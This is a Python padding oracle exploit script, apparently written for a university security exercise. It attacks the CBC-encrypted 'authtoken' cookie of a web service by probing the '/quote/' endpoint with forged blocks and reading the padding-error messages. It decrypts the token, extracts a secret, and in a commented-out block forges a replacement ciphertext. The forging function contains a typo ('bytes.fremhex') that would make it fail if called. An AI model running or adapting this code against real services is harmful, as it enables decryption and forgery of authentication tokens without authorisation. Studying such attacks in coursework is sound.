import sys
import requests
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES

def oracle(url, ciphertext):
    block_size = 16
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    result = b''
    iv = blocks[0] # IV is the first block
    zero_iv = None
    for block in blocks[1:]:
        zero_iv = [0] * 16 # Create a zero IV
        for pad_val in range(1,block_size+1):
            padding_iv = [pad_val ^ b for b in zero_iv] # Create the padding IV
            
            for candidate in range(256):
                #print(f"Trying byte {candidate} (0x{candidate:02x}) for padding value {pad_val}")
                padding_iv[-pad_val] = candidate
                response = requests.get(f'{url}/quote/', cookies={'authtoken': (bytes(padding_iv) + block).hex()})
                temp = None
                if response.text.__contains__("PKCS#7 padding is incorrect") or response.text.__contains__("Padding is incorrect."):
                    temp = False
                else:
                    temp = True
                if temp: # IF the padding is correct then we can break
                    #print(f"Padding is correct for byte {candidate} (0x{candidate:02x})")
                    if pad_val == 1:
                        # make sure the padding really is of length 1 by changing
                        # the penultimate block and querying the oracle again
                        padding_iv[-2] ^= 1
                        response = requests.get(f'{url}/quote/', cookies={'authtoken': (bytes(padding_iv) + block).hex()})
                        if response.text.__contains__("PKCS#7 padding is incorrect") or response.text.__contains__("Padding is incorrect."):
                            temp = False
                        else:
                            temp = True
                        if not temp:
                            continue  # false positive; keep searching
                    break
            else:
                raise Exception("no valid padding byte found (is the oracle working correctly?)")
            zero_iv[-pad_val] = candidate ^ pad_val
        pt = bytes(a ^ b for a,b in zip(iv,zero_iv))
        result = result + pt
        iv = block
    return result, zero_iv

def create_new_ciphertext(original_ciphertext, original_iv, known_plaintext, new_plaintext):

    print(original_ciphertext)
    print(original_iv)
    print(known_plaintext)
    print(new_plaintext)
    # XOR the known plaintext with the known ciphertext
    intermediate_value = bytes(a ^ b for a, b in zip(bytes.fremhex(original_ciphertext[-1]), pad(known_plaintext,16)))
    
    # XOR the intermediate value with the new plaintext
    new_ciphertext = bytes(a ^ b for a, b in zip(intermediate_value, pad(new_plaintext,16)))
    print(len(new_ciphertext))
    return new_ciphertext


def main():
    #BASE_URL = 'http://localhost:5000'
    BASE_URL = 'https://cbc-rsa.syssec.dk:8000/'
    cookie = requests.get(f'{BASE_URL}') # base_url is the first argument
    cookie_header = cookie.headers.get('Set-Cookie') # get the cookie header
    authtoken = cookie_header.split('=')[1].split(';')[0] # get the authtoken
    res, zero_iv = oracle(f'{BASE_URL}',bytes.fromhex(authtoken)) # call the oracle and run padding oracle attack
    print("Recovered plaintext:", unpad(res,16))
    secret = res.split(b'"')[1]
    print("Secret:", secret)
    """
    # Extract the IV from the authtoken
    iv = bytes.fromhex(authtoken[:32])  # Assuming the IV is the first 16 bytes of the authtoken

    # Forge a new ciphertext with the desired plaintext and extracted IV
    desired_plaintext = secret + bytes(' plain CBC is not secure!', 'utf-8')
    #desired_plaintext = pad(desired_plaintext, 16)
    print(len(desired_plaintext))
    #new_ciphertext = create_new_ciphertext(authtoken, res, desired_plaintext)  # Include the IV in the ciphertext
    new_ciphertext = create_new_ciphertext(authtoken, iv, unpad(res,16), desired_plaintext)
    # Print or use the new ciphertext
    print("New Ciphertext:", new_ciphertext)

    # Send the forged ciphertext to the server and observe the response
    response = requests.get(f'{BASE_URL}/quote/', cookies={'authtoken': new_ciphertext.hex()})
    print(response.text)
    """ 

if __name__ == '__main__':
    main()